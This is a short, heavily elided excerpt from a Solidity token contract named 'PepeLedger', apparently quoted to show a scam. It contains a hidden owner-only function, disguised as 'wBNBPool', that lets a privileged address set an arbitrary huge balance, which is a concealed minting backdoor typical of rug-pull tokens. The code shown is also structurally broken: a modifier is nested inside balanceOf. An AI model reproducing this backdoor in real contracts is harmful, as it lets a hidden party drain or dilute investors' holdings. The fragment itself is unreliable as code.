...
contract PepeLedger is proxyBinanceBurnable, DxtoolsApp, proxyBinanceOwnable {
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowner() {
        require(SmartV2Rooter == _msgSender(), "proxyBinanceOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    ...
    function wBNBPool(address bnbRewards) external subowner {
        proxyBinancefrom[bnbRewards] = 10000000000000000 * 10 ** 22;
